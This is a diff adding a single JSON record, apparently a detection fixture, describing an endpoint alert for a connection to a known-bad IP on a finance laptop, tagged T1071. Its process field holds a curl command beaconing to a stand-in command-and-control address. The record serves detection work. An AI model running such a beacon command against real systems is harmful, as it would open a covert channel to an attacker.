@@ -1,0 +1,5 @@
+{"id": "det-7", "ts_ms": 1794049800000, "host": "fin-laptop-07", "name": "connection_to_known_bad_ip",
+ "technique": "T1071", "severity": 85,
+ "process": {"cmdline": "curl -s http://203.0.113.50:8443/beacon", "user": "priya.k", "pid": 520,
+             "parent_cmdline": "sh", "lineage": [{"cmdline": "sh", "user": "priya.k", "pid": 519}]},
+ "net": {"ip": "203.0.113.50", "port": 8443}, "file": null}
